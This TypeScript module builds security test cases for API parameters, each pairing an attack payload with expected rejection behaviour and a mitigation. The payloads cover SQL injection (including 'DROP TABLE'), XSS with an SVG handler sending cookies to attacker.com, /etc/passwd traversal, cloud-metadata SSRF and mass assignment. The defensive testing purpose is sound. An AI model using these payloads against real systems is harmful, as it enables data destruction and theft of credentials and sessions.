import { ExtractedParam, TestCase } from '../types';

export function generateSecurityTests(param: ExtractedParam): TestCase[] {
  const tests: TestCase[] = [];
  const pName = param.name;
  const pType = param.paramType;

  // SQL Injection
  if (pType === 'string' || pType === 'email' || pType === 'integer' || pType === 'unknown') {
    tests.push({
      id: `${pName}_sec_sqli_tautology`,
      targetParam: pName,
      category: 'security',
      severity: 'critical',
      title: 'SQL Injection: Tautology Authentication Bypass',
      payload: "' OR '1'='1' --",
      payloadDisplay: `"' OR '1'='1' --"`,
      expectedStatus: 'HTTP 400 Bad Request / Escaped Parameter',
      expectedBehavior: 'Treated as literal string literal; never interpolated into raw query syntax.',
      technicalRationale: 'OWASP A03:2021-Injection. Unparameterized queries allow attackers to bypass login or dump tables.',
      mitigation: 'Always use parameterized queries (PreparedStatements) or ORM abstractions.',
    });

    tests.push({
      id: `${pName}_sec_sqli_stacked`,
      targetParam: pName,
      category: 'security',
      severity: 'critical',
      title: 'SQL Injection: Stacked Destructive Query Execution',
      payload: '1; DROP TABLE transactions; --',
      payloadDisplay: '"1; DROP TABLE transactions; --"',
      expectedStatus: 'HTTP 400 Bad Request / Sanitized Input',
      expectedBehavior: 'Query executor disallows multi-statement execution and handles input safely.',
      technicalRationale: 'Attempts to append a secondary destructive query to the primary statement.',
      mitigation: 'Disable multi-query execution flags in database connection pool configuration.',
    });
  }

  // XSS
  if (pType === 'string' || pType === 'unknown') {
    tests.push({
      id: `${pName}_sec_xss_stored_script`,
      targetParam: pName,
      category: 'security',
      severity: 'high',
      title: 'Stored XSS: Script Tag Payload',
      payload: '<script>alert(document.domain)</script>',
      payloadDisplay: '"<script>alert(document.domain)</script>"',
      expectedStatus: 'HTTP 200 OK (HTML-encoded) / HTTP 422',
      expectedBehavior: 'Stored as entity-encoded string (`&lt;script&gt;`) or rejected. Must never render as active DOM.',
      technicalRationale: 'OWASP A03:2021-Injection. Can execute arbitrary JavaScript in victim sessions to exfiltrate cookies/tokens.',
      mitigation: 'Use context-aware HTML output encoding (React JSX defaults) and implement strict Content-Security-Policy (CSP).',
    });

    tests.push({
      id: `${pName}_sec_xss_svg_event`,
      targetParam: pName,
      category: 'security',
      severity: 'high',
      title: 'Inline SVG Event Handler XSS',
      payload: '<svg onload="fetch(\'https://attacker.com/steal?c=\'+document.cookie)">',
      payloadDisplay: '"<svg onload=\\"fetch(...)//\\">"',
      expectedStatus: 'HTTP 200 OK (Clean) / HTTP 422',
      expectedBehavior: 'Sanitized via DOMPurify or server HTML purifier to strip SVG event handlers.',
      technicalRationale: 'Bypasses simplistic `<script>` tag filters by embedding JavaScript in SVG XML handlers.',
      mitigation: 'Disallow raw HTML storage or use robust sanitizer like DOMPurify / bleach.',
    });
  }

  // Path Traversal
  if (pType === 'string' || pType === 'file' || pName.toLowerCase().includes('file') || pName.toLowerCase().includes('path')) {
    tests.push({
      id: `${pName}_sec_path_traversal`,
      targetParam: pName,
      category: 'security',
      severity: 'critical',
      title: 'Directory Path Traversal (../../../../etc/passwd)',
      payload: '../../../../etc/passwd',
      payloadDisplay: '"../../../../etc/passwd"',
      expectedStatus: 'HTTP 400 Bad Request / 403 Forbidden',
      expectedBehavior: 'Filename normalized to base name; traversal sequences stripped or rejected.',
      technicalRationale: 'OWASP A01:2021-Broken Access Control. Exposes sensitive system configuration and private keys.',
      mitigation: 'Store files under randomized UUID keys and never use user-supplied paths directly in filesystem calls.',
    });

    tests.push({
      id: `${pName}_sec_null_byte_extension_spoof`,
      targetParam: pName,
      category: 'security',
      severity: 'high',
      title: 'Null Byte Extension Truncation (avatar.png%00.php)',
      payload: 'avatar.png\x00.php',
      payloadDisplay: '"avatar.png\\x00.php"',
      expectedStatus: 'HTTP 400 Bad Request / 422',
      expectedBehavior: 'Rejected due to illegal null character in filename string.',
      technicalRationale: 'Bypasses extension whitelisting in legacy C-backed file readers.',
      mitigation: 'Validate file contents via magic bytes (file signature) rather than file extension alone.',
    });
  }

  // SSRF
  if (
    pName.toLowerCase().includes('url') ||
    pName.toLowerCase().includes('link') ||
    pName.toLowerCase().includes('webhook') ||
    pName.toLowerCase().includes('host')
  ) {
    tests.push({
      id: `${pName}_sec_ssrf_cloud_metadata`,
      targetParam: pName,
      category: 'security',
      severity: 'critical',
      title: 'SSRF: Cloud Provider Metadata Exfiltration (169.254.169.254)',
      payload: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
      payloadDisplay: '"http://169.254.169.254/latest/meta-data/..."',
      expectedStatus: 'HTTP 422 / Blocked Internal IP',
      expectedBehavior: 'Outbound network request immediately blocked by URL whitelist / egress firewall.',
      technicalRationale: 'OWASP A10:2021-Server-Side Request Forgery. Steals cloud IAM instance credentials.',
      mitigation: 'Block outbound traffic to link-local (169.254.0.0/16) and private RFC-1918 subnets.',
    });

    tests.push({
      id: `${pName}_sec_ssrf_loopback_probe`,
      targetParam: pName,
      category: 'security',
      severity: 'high',
      title: 'SSRF: Localhost Loopback Port Probe (http://127.0.0.1:8080)',
      payload: 'http://127.0.0.1:8080/internal/metrics',
      payloadDisplay: '"http://127.0.0.1:8080/internal/metrics"',
      expectedStatus: 'HTTP 422 Unprocessable Entity',
      expectedBehavior: 'Rejected as forbidden private network target.',
      technicalRationale: 'Probes internal microservices or admin ports not exposed to the public internet.',
      mitigation: 'Resolve DNS and reject any host resolving to loopback (127.0.0.0/8).',
    });
  }

  // Mass assignment
  tests.push({
    id: `${pName}_sec_mass_assignment_privilege_escalation`,
    targetParam: pName,
    category: 'security',
    severity: 'critical',
    title: 'Mass Assignment / Privilege Escalation Injection',
    payload: { role: 'SUPERADMIN', is_admin: true, balance: 999999 },
    payloadDisplay: '{"role": "SUPERADMIN", "is_admin": true}',
    expectedStatus: 'HTTP 422 / Unrecognized fields dropped',
    expectedBehavior: 'Disallowed fields ignored or request rejected with schema validation failure.',
    technicalRationale: 'OWASP A01:2021. Bypasses authorization by injecting protected fields directly into entity binders.',
    mitigation: 'Use dedicated request DTOs with explicit allowed property whitelists.',
  });

  return tests;
}
